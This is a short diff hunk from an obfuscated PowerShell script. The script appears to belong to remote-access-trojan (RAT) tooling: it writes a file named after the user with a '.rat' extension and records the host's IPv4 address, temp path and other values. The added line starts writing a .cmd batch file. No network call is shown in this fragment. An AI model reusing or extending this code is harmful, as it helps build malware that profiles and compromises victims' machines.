@@ -32,6 +32,7 @@ $CRYnrkaDbe = "$env:UserName.rat"
 $oNumpPlFnH = Get-Content XbrMzmCUiE.txt
 $XpKqtwxTVC = Get-Content UJbMLjTIDr.txt
 $AhdjktGyiZ = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress
+Add-Content -Path "$NyZnoLKCIs/GiLqXiexKP.cmd" -Value "@echo off"
 Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ
 Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP
 Add-Content -Path $CRYnrkaDbe -Value $env:temp
